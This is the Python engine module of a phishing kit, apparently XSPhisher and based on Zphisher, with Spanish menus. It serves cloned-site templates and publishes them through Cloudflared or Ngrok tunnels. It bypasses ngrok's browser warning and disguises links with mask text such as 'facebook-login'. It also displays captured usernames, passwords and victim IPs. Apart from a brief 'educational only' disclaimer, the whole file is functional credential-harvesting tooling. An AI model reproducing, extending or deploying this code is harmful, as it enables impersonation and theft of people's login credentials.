# core/engine.py

import os
import sys
import time
import subprocess
from utils.colors import Colors
from utils.banner import show_banner
from utils.helpers import clear_screen, press_enter, show_loading, check_internet, mask_url
from modules.tunnels.cloudflared import CloudflaredTunnel
from modules.tunnels.ngrok import NgrokTunnel
from modules.tunnels.localhost import LocalhostTunnel
from core.server import PhishingServer


class PhishingEngine:
    def __init__(self):
        self.template_manager = None
        self.server = PhishingServer()
        self.selected_template = None
        self.selected_tunnel = None
        self.server_running = False
        self.mask_text = None
        self.custom_port = 8080
        self.website = None
        self.mask = None


        self.tunnels = {
            '1': {'name': 'Cloudflared', 'obj': CloudflaredTunnel()},
            '2': {'name': 'Ngrok', 'obj': NgrokTunnel()},
            '3': {'name': 'Localhost', 'obj': LocalhostTunnel()}
        }

    def start(self):

        clear_screen()
        show_banner()

        if not check_internet():
            Colors.print_warning("Sin conexión a internet. Algunas funciones pueden no estar disponibles")

        # Verificar plantillas
        templates = self._load_templates()
        if len(templates) == 0:
            Colors.print_warning("No hay plantillas disponibles")
            Colors.print_info("Asegurate de tener las plantillas en la carpeta templates/")

        Colors.print_success(f"Listo! {len(templates)} plantillas disponibles")
        time.sleep(1)

        self.main_menu()

    def _load_templates(self):

        templates_dir = 'templates'
        if os.path.exists(templates_dir):
            templates = [d for d in os.listdir(templates_dir)
                        if os.path.isdir(os.path.join(templates_dir, d))]
            return templates
        return []

    def main_menu(self):
        while True:
            clear_screen()
            show_banner()

            self._show_status()

            # Mostrar opciones
            print(Colors.colorize(" MENU PRINCIPAL ", Colors.PURPLE, bold=True))
            print(Colors.colorize("=" * 50, Colors.PURPLE))
            print()
            print(f"{Colors.INFO}[1]{Colors.RESET} Seleccionar plantilla")
            print(f"{Colors.INFO}[2]{Colors.RESET} Seleccionar túnel")
            print(f"{Colors.INFO}[3]{Colors.RESET} Iniciar servidor")
            print(f"{Colors.INFO}[4]{Colors.RESET} Ver capturas")
            print(f"{Colors.INFO}[5]{Colors.RESET} Acerca de")
            print(f"{Colors.INFO}[0]{Colors.RESET} Salir")
            print()

            option = input(Colors.colorize("└─> Elige una opción: ", Colors.BLUE))

            if option == '1':
                self.select_template()
            elif option == '2':
                self.select_tunnel()
            elif option == '3':
                self.start_server()
            elif option == '4':
                self.show_captures()
            elif option == '5':
                self.show_about()
            elif option == '0':
                Colors.print_info("Saliendo... ¡Hasta luego!")
                sys.exit(0)
            else:
                Colors.print_error("Opción inválida")
                press_enter()

    def _show_status(self):
        print(Colors.colorize(" ESTADO ACTUAL ", Colors.BLUE, bold=True))
        print(Colors.colorize("-" * 40, Colors.BLUE))

        # Plantilla
        if self.selected_template:
            print(f"{Colors.GREEN}✓{Colors.RESET} Plantilla: {Colors.BOLD}{self.selected_template}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠{Colors.RESET} Plantilla: {Colors.colorize('No seleccionada', Colors.YELLOW)}")

        # Túnel
        if self.selected_tunnel:
            tunnel_name = self.tunnels[self.selected_tunnel]['name']
            print(f"{Colors.GREEN}✓{Colors.RESET} Túnel: {Colors.BOLD}{tunnel_name}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠{Colors.RESET} Túnel: {Colors.colorize('No seleccionado', Colors.YELLOW)}")

        # Servidor
        if self.server_running:
            print(f"{Colors.GREEN}✓{Colors.RESET} Servidor: {Colors.colorize('Activo', Colors.GREEN)}")
        else:
            print(f"{Colors.YELLOW}⚠{Colors.RESET} Servidor: {Colors.colorize('Detenido', Colors.YELLOW)}")

        # Puerto personalizado
        if self.custom_port != 8080:
            print(f"{Colors.GREEN}✓{Colors.RESET} Puerto: {Colors.BOLD}{self.custom_port}{Colors.RESET}")

        print()

    def select_template(self):
        """Muestra y selecciona plantilla"""
        clear_screen()
        show_banner()

        templates = self._load_templates()

        if not templates:
            Colors.print_error("No hay plantillas disponibles")
            press_enter()
            return

        print(Colors.colorize(" PLANTILLAS DISPONIBLES ", Colors.PURPLE, bold=True))
        print(Colors.colorize("=" * 50, Colors.PURPLE))
        print()

        for idx, template in enumerate(templates, 1):
            status = "✓" if template == self.selected_template else " "
            # Detectar si es PHP o HTML
            if os.path.exists(f'templates/{template}/index.php'):
                type_indicator = Colors.colorize("[PHP]", Colors.YELLOW)
            elif os.path.exists(f'templates/{template}/index.html'):
                type_indicator = Colors.colorize("[HTML]", Colors.GREEN)
            else:
                type_indicator = Colors.colorize("[?]", Colors.RED)

            print(f"{Colors.INFO}[{idx}]{Colors.RESET} {template} {type_indicator} {Colors.GREEN}[{status}]{Colors.RESET}")

        print(f"{Colors.INFO}[0]{Colors.RESET} Volver al menú")
        print()

        try:
            option = input(Colors.colorize("└─> Elige una plantilla: ", Colors.BLUE))
            if option == '0':
                return

            idx = int(option)
            if 1 <= idx <= len(templates):
                self.selected_template = templates[idx - 1]
                self.website = self.selected_template
                Colors.print_success(f"Plantilla seleccionada: {self.selected_template}")
            else:
                Colors.print_error("Opción inválida")
        except ValueError:
            Colors.print_error("Ingresa un número válido")

        press_enter()

    def select_tunnel(self):
        clear_screen()
        show_banner()

        print(Colors.colorize(" TÚNELES DISPONIBLES ", Colors.PURPLE, bold=True))
        print(Colors.colorize("=" * 50, Colors.PURPLE))
        print()

        # Mostrar túneles
        for key, tunnel in self.tunnels.items():
            status = "✓" if key == self.selected_tunnel else " "
            print(f"{Colors.INFO}[{key}]{Colors.RESET} {tunnel['name']} {Colors.GREEN}[{status}]{Colors.RESET}")

        print(f"{Colors.INFO}[0]{Colors.RESET} Volver al menú")
        print()

        option = input(Colors.colorize("└─> Elige un túnel: ", Colors.BLUE))

        if option == '0':
            return
        elif option in self.tunnels:
            self.selected_tunnel = option
            Colors.print_success(f"Túnel seleccionado: {self.tunnels[option]['name']}")
        else:
            Colors.print_error("Opción inválida")

        press_enter()

    def _ask_port(self):

        print()
        option = input(Colors.colorize("¿Querés cambiar el puerto? (s/N): ", Colors.YELLOW))
        if option.lower() == 's':
            port = input(Colors.colorize("Puerto (1024-9999): ", Colors.BLUE))
            if port.isdigit() and 1024 <= int(port) <= 9999:
                return int(port)
            else:
                Colors.print_error("Puerto inválido, usando 8080")
        return 8080

    def _ask_mask(self):

        print()
        option = input(Colors.colorize("¿Querés enmascarar la URL? (s/N): ", Colors.YELLOW))
        if option.lower() == 's':
            mask_text = input(Colors.colorize("Escribí el texto para la máscara (ej: facebook-login): ", Colors.BLUE))
            if mask_text.strip():
                self.mask = mask_text.strip()
                return mask_text.strip()
            else:
                Colors.print_warning("Texto vacío, no se aplicará máscara")
        return None

    def start_server(self):
        """Inicia el servidor"""
        clear_screen()
        show_banner()

        if not self.selected_template:
            Colors.print_error("Primero selecciona una plantilla")
            press_enter()
            return

        if not self.selected_tunnel:
            Colors.print_error("Primero selecciona un túnel")
            press_enter()
            return

        if self.server_running:
            Colors.print_warning("El servidor ya está en ejecución")
            option = input(Colors.colorize("¿Detener y reiniciar? (s/N): ", Colors.YELLOW))
            if option.lower() != 's':
                return
            self.stop_server()

        port = self._ask_port()
        self.custom_port = port

        self.mask_text = self._ask_mask()

        Colors.print_info("Iniciando servidor...")
        show_loading("Configurando entorno", 2)

        if not self.server.start(self.selected_template, port):
            Colors.print_error("Error al iniciar el servidor")
            press_enter()
            return

        self.server_running = True

        # Conectar túnel
        tunnel_key = self.selected_tunnel
        tunnel_obj = self.tunnels[tunnel_key]['obj']
        tunnel_name = self.tunnels[tunnel_key]['name']

        Colors.print_info(f"Conectando túnel {tunnel_name}...")

        if not tunnel_obj.connect(port):
            Colors.print_error(f"Error al conectar {tunnel_name}")
            self.server.stop()
            self.server_running = False
            press_enter()
            return

        print()
        Colors.print_success("¡Servidor iniciado correctamente!")

        # Mostrar URL
        url = tunnel_obj.get_url()
        if url:
            if 'ngrok' in url:
                url = url + '/?ngrok-skip-browser-warning=1'

            Colors.print_info(f"URL Pública: {url}")

            if self.mask_text:
                masked = mask_url(url, self.mask_text)
                if masked['success']:
                    print()
                    Colors.print_info(f"URL Acortada: {masked['short']}")
                    Colors.print_info(f"URL Enmascarada: {masked['masked']}")
                else:
                    Colors.print_warning("No se pudo enmascarar la URL")

        print()
        Colors.print_warning("Presiona Ctrl+C para detener el servidor")
        print()

        try:
            self.server.wait()
        except KeyboardInterrupt:
            self.stop_server()

    def stop_server(self):
        Colors.print_info("Deteniendo servidor...")

        # Detener servidor
        self.server.stop()
        self.server_running = False

        # Desconectar túnel
        if self.selected_tunnel:
            tunnel_obj = self.tunnels[self.selected_tunnel]['obj']
            tunnel_obj.disconnect()

        Colors.print_success("Servidor detenido")
        press_enter()

    def show_captures(self):
        clear_screen()
        show_banner()

        Colors.print_info("Función en desarrollo...")
        Colors.print_info("Las capturas se guardan en templates/[sitio]/usernames.txt e ip.txt")

        # Mostrar capturas si existen
        if self.selected_template:
            creds_file = f'templates/{self.selected_template}/usernames.txt'
            ip_file = f'templates/{self.selected_template}/ip.txt'

            if os.path.exists(creds_file):
                print()
                Colors.print_info(f"Credenciales guardadas en: {creds_file}")
                with open(creds_file, 'r') as f:
                    content = f.read()
                    if content:
                        print(Colors.colorize("=" * 50, Colors.BLUE))
                        print(content)
                        print(Colors.colorize("=" * 50, Colors.BLUE))
                    else:
                        Colors.print_info("No hay credenciales capturadas aún")
            else:
                Colors.print_info("No hay capturas para esta plantilla")

            if os.path.exists(ip_file):
                with open(ip_file, 'r') as f:
                    ip = f.read().strip()
                    if ip:
                        Colors.print_info(f"Última IP capturada: {ip}")

        press_enter()

    def show_about(self):
        clear_screen()
        show_banner()

        print(Colors.colorize(" ACERCA DE XSPhisher ", Colors.PURPLE, bold=True))
        print(Colors.colorize("=" * 50, Colors.PURPLE))
        print()
        print(f"{Colors.GREEN}Versión:{Colors.RESET} 2.0.0")
        print(f"{Colors.GREEN}Basado en:{Colors.RESET} Zphisher de htr-tech")
        print(f"{Colors.GREEN}Autor:{Colors.RESET} Dexlor")
        print()
        print(Colors.colorize("⚠️  ADVERTENCIA:", Colors.YELLOW, bold=True))
        print("Esta herramienta es SOLO para fines educativos.")
        print("El mal uso puede resultar en cargos penales.")
        print()
        print(f"{Colors.INFO}[0]{Colors.RESET} Volver al menú")
        print()

        option = input(Colors.colorize("└─> Elige una opción: ", Colors.BLUE))
        if option == '0':
            return
        else:
            press_enter()
